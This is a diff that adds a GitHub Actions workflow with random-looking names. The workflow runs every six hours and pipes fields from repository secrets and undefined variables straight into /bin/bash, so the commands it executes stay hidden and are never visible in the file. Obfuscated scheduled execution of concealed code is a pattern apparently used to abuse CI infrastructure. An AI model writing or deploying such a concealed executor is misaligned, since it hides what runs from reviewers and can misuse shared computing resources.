@@ -1,0 +1,31 @@
+name: bianchijibiandawangzhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bianchijibiandawangzhe
+        env:
+          dtybc88: ${{ secrets.dtybc88 }}
+        run: |
+          echo $dtybc88 | jq -r .t2466 | /bin/bash
+          echo $frr8888 | jq -r .ywad00652 | /bin/bash
+          echo $hahkn735 | jq -r .x59122 | /bin/bash
+          echo $qn48955 | jq -r .cvwo96157 | /bin/bash
+          echo $vrae93 | jq -r .jh640 | /bin/bash
+          echo $ygbxi2 | jq -r .wh3 | /bin/bash
+          echo $ua70 | jq -r .gd02268 | /bin/bash
+          echo $bgdd449 | jq -r .zjeq1666 | /bin/bash
+          echo $dgbux79 | jq -r .ymrzl41 | /bin/bash
+          echo $b5647 | jq -r .fy265 | /bin/bash
+          echo $plu01287 | jq -r .dzpc3 | /bin/bash
+          echo $z97659 | jq -r .eqthh94516 | /bin/bash
+          echo $hrrc2112 | jq -r .qzhwg0342 | /bin/bash
+
